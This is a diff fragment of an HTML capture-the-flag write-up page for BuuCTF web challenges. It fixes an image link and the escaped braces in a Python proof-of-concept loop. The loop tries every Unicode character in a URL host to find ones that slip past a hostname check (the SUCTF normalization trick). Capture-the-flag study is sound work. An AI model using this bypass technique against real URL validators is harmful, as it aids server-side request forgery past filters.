-<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/18.png"></p>
+<p><img src="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.htm/18.png"></p>
 <p><strong>poc</strong></p>
 <pre><code class="python">&gt;&gt;&gt; chr(10000)
 &#39;✐&#39;
@@ -1073,7 +1073,7 @@ from urllib import parse
 def get_unicode():
     for x in range(65536):
         uni = chr(x)
-        url = &quot;http://suctf.c&#123;&#125;&quot;.format(uni)
+        url = &quot;http://suctf.c{}&quot;.format(uni)
         try:
             if getUrl(url):
                 print(&quot;str:&quot;,uni,&#39;unicode:&#39;,x)
